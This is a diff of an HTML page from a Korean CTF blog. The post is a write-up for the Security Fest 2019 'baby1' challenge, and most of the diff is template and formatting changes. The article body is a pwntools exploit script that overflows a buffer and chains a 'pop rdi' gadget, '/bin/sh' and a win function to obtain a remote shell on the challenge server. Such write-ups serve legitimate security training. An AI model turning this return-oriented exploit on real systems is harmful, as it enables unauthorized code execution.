@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="utf-8">
-	<meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416">
+<head>
+    <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="utf-8" />
+	<meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416"/>
 	<!-- Global site tag (gtag.js) - Google Analytics -->
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140827316-1"></script>
 	<script>
@@ -18,52 +18,70 @@
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-        <meta name="keywords" content="CTF">
+        <meta name="keywords" content="CTF" />
     
-    <meta name="description" content="Baby2 12345678910111213141516171819from pwn import *#r = process(&apos;./baby1&apos;)r = remote(&apos;baby-01.pwn.beer&apos;, 10001)e = ELF(&apos;./baby1&apos;)binsh = e.search(&quot;/bin/sh&quot;).next()pr = 0x0000000000400793 # pop rdi;">
-<meta name="keywords" content="CTF">
+    <meta name="description" content="Baby2 12345678910111213141516171819from pwn import *#r &#x3D; process(&amp;#x27;.&#x2F;baby1&amp;#x27;)r &#x3D; remote(&amp;#x27;baby-01.pwn.beer&amp;#x27;, 10001)e &#x3D; ELF(&amp;#x27;.&#x2F;baby1&amp;#x27;)binsh &#x3D; e.search(&quot;&#x2F;bin&#x2F;sh&quot;).n">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Security Fest 2019 baby1">
 <meta property="og:url" content="https://j0n9hyun.xyz/writeups/pwn/Security-Fest-2019-baby1/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="Baby2 12345678910111213141516171819from pwn import *#r = process(&apos;./baby1&apos;)r = remote(&apos;baby-01.pwn.beer&apos;, 10001)e = ELF(&apos;./baby1&apos;)binsh = e.search(&quot;/bin/sh&quot;).next()pr = 0x0000000000400793 # pop rdi;">
-<meta property="og:locale" content="ko">
-<meta property="og:updated_time" content="2019-05-27T14:43:16.000Z">
+<meta property="og:description" content="Baby2 12345678910111213141516171819from pwn import *#r &#x3D; process(&amp;#x27;.&#x2F;baby1&amp;#x27;)r &#x3D; remote(&amp;#x27;baby-01.pwn.beer&amp;#x27;, 10001)e &#x3D; ELF(&amp;#x27;.&#x2F;baby1&amp;#x27;)binsh &#x3D; e.search(&quot;&#x2F;bin&#x2F;sh&quot;).n">
+<meta property="og:locale" content="ko_KR">
+<meta property="article:published_time" content="2019-05-24T00:01:52.000Z">
+<meta property="article:modified_time" content="2019-05-27T14:43:16.000Z">
+<meta property="article:author" content="j0n9hyun">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Security Fest 2019 baby1">
-<meta name="twitter:description" content="Baby2 12345678910111213141516171819from pwn import *#r = process(&apos;./baby1&apos;)r = remote(&apos;baby-01.pwn.beer&apos;, 10001)e = ELF(&apos;./baby1&apos;)binsh = e.search(&quot;/bin/sh&quot;).next()pr = 0x0000000000400793 # pop rdi;">
     
-	<link rel="canonical" href="https://j0n9hyun.xyz/writeups/pwn/security-fest-2019-baby1/">
+	<link rel="canonical" href="https://j0n9hyun.xyz/writeups/pwn/security-fest-2019-baby1/"/>
 
     
 
     
-        <link rel="icon" href="https://ctf.j0n9hyun.xyz/files/fbf1004228885fb7ac783e1d540d4538/vector.ico">
+        <link rel="icon" href="https://ctf.j0n9hyun.xyz/files/fbf1004228885fb7ac783e1d540d4538/vector.ico" />
     
 
-    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
-    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
 
-	<link rel="stylesheet" type="text/css" href>
-	<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">	
-	<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
-    <link rel="stylesheet" href="/css/style.css">
+    
+<link rel="stylesheet" href="/libs/titillium-web/styles.css">
 
-    <script src="/libs/jquery/3.3.1/jquery.min.js"></script>
     
-    
-        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
-    
-    
-        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-    
-    
-    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
 
 
-</head>
-</html>
+	<link rel="stylesheet" type="text/css" href="">
+	
+<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">
+	
+	
+<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+<script src="/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+
+
+<meta name="generator" content="Hexo 5.0.2"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
 <body>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="wrap">
         <header id="header">
@@ -91,13 +109,13 @@
                     <div class="nav-container-inner">
                         <ul id="main-nav">
                             
-                                <li class="main-nav-list-item">
+                                <li class="main-nav-list-item" >
                                     <a class="main-nav-list-link" href="/">Home</a>
                                 </li>
                             
                                         <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Daily/">Daily</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/">Develop</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Script/">Script</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Theory/">Theory</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Crypto/">Crypto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Foren/">Foren</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Rev/">Rev</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Web/">Web</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/misc/">misc</a></li></ul></li></ul>
                                     
-                                <li class="main-nav-list-item">
+                                <li class="main-nav-list-item" >
                                     <a class="main-nav-list-link" href="/about">About</a>
                                 </li>
                             
@@ -106,14 +124,14 @@
                             <div id="search-form-wrap">
 
     <form class="search-form">
-        <input type="text" class="ins-search-input search-form-input" placeholder="검색">
+        <input type="text" class="ins-search-input search-form-input" placeholder="검색" />
         <button type="submit" class="search-form-submit"></button>
     </form>
     <div class="ins-search">
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="입력">
+            <input type="text" class="ins-search-input" placeholder="입력" />
             <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="ins-section-wrapper">
@@ -137,7 +155,9 @@
     window.INSIGHT_CONFIG = INSIGHT_CONFIG;
 })(window);
 </script>
+
 <script src="/js/insight.js"></script>
+
 
 </div>
                         </nav>
@@ -187,7 +207,7 @@
                 
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/CTF/">CTF</a>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>
     </div>
 
   			<span class="reading-time">⏱ 1 분</span>
@@ -196,7 +216,7 @@
         
         <div class="article-entry" itemprop="articleBody">
             <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="baby2"><a class="markdownIt-Anchor" href="#baby2"></a> Baby2</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process('./baby1')</span></span><br><span class="line">r = remote(<span class="string">'baby-01.pwn.beer'</span>, <span class="number">10001</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby1'</span>)</span><br><span class="line">binsh = e.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">pr = <span class="number">0x0000000000400793</span> <span class="comment"># pop rdi; ret </span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">p = <span class="string">"A"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(binsh)</span><br><span class="line">p += p64(e.symbols[<span class="string">'win'</span>])</span><br><span class="line">sl(p)</span><br><span class="line">ru(<span class="string">"input: "</span>)</span><br><span class="line">ex();</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./baby1&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;baby-01.pwn.beer&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./baby1&#x27;</span>)</span><br><span class="line">binsh = e.search(<span class="string">&quot;/bin/sh&quot;</span>).next()</span><br><span class="line">pr = <span class="number">0x0000000000400793</span> <span class="comment"># pop rdi; ret </span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;A&quot;</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(binsh)</span><br><span class="line">p += p64(e.symbols[<span class="string">&#x27;win&#x27;</span>])</span><br><span class="line">sl(p)</span><br><span class="line">ru(<span class="string">&quot;input: &quot;</span>)</span><br><span class="line">ex();</span><br></pre></td></tr></table></figure>
 <center><small>[Exploit Code]</small></center> <br>
 
         </div>
@@ -205,7 +225,7 @@
 
 
 
-    <a data-url="https://j0n9hyun.xyz/writeups/pwn/Security-Fest-2019-baby1/" data-id="ck5p1noph0035lyfp7z8vyf36" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="https://j0n9hyun.xyz/writeups/pwn/Security-Fest-2019-baby1/" data-id="ckdzanqf8003kz5mpein1198w" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -284,7 +304,7 @@
         "dateModified": "2019-05-27",
         "url": "https://j0n9hyun.xyz/writeups/pwn/Security-Fest-2019-baby1/",
         "description": " Baby2
-12345678910111213141516171819from pwn import *#r = process('./baby1')r = remote('baby-01.pwn.beer', 10001)e = ELF('./baby1')binsh = e.search("/bin/sh").next()pr = 0x0000000000400793 # pop rdi; "
+12345678910111213141516171819from pwn import *#r = process(&#x27;./baby1&#x27;)r = remote(&#x27;baby-01.pwn.beer&#x27;, 10001)e = ELF(&#x27;./baby1&#x27;)binsh = e.search(&quot;/bin/sh&quot;).n"
         "wordCount": 115
     }
 </script>
@@ -402,7 +422,7 @@
     <div class="widget-wrap widget-list">
         <h3 class="widget-title">태그</h3>
         <div class="widget">
-            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">21</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theory/">Theory</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/">Tips</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wargame/">Wargame</a><span class="tag-list-count">3</span></li></ul>
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">21</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theory/" rel="tag">Theory</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/" rel="tag">Tips</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wargame/" rel="tag">Wargame</a><span class="tag-list-count">3</span></li></ul>
         </div>
     </div>
 
@@ -457,25 +477,47 @@
 
 
     
-        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
     
     
-        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
     
     
 
 
 
 <!-- Custom Scripts -->
+
 <script src="/js/main.js"></script>
+
 
     </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </body>
